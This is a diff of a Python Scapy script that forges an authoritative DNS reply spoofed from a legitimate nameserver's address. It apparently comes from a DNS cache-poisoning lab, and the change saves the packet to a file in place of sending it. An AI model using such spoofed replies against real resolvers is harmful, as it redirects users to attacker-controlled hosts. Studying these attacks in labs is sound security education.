@@ -19,7 +19,7 @@ NSsec = DNSRR(rrname=domain, type='NS', rdata=ns, ttl=259200)
 
 # DNS Header
 dns = DNS(id=0xAAAA, aa=1, rd=1, qr=1, qdcount=1, ancount=1, 
-nscount=1, arcount=0, qd=Qdsec, an=Anssec, ns=NSsec)
+          nscount=1, arcount=0, qd=Qdsec, an=Anssec, ns=NSsec)
 
 # IP Header
 ip = IP(dst=server_ip, src=legit_ns1)
@@ -30,6 +30,6 @@ udp = UDP(dport=33333, sport=53, chksum=0)
 # Complete Spoofed Reply
 reply = ip/udp/dns
 
-# Send the Spoofed Reply
-send(reply)
-
+# Save the Spoofed Reply to a file
+with open("ip_resp.bin", "wb") as f:
+    f.write(bytes(reply))
